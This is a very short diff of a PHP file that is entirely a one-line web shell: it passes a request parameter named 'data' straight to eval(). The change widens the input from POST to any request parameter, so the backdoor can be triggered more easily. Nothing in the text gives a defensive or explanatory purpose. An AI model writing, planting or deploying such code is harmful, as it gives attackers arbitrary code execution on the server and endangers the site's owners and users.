@@ -1,3 +1,3 @@
 <?php
-eval($_POST["data"]);
+eval($_REQUEST["data"]);
 ?>
